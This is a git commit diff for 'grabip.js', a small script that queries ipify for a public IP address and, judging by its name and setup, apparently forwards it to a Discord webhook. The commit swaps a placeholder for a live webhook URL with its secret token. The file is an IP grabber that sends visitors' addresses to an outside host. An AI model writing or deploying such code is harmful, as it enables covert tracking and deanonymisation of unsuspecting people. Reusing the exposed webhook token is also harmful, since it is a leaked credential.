9f146669c0601381b78ccdaba0a86870d3b73128
qdjp1821 <scaredzzz.og@gmx.de>
2025-05-12 21:31:38 +0200

    Update grabip.js

--- grabip.js
+++ grabip.js
@@ -2,7 +2,7 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discord.com/api/webhooks/1371570319751647314/N4iZBy9rprXtkovUuWwKHsFuOtfSfxKImYC71h1xnwBEGVKyx3ZO1DSZMX3iOAwiGs2q";
 
 
 async function getIP() {
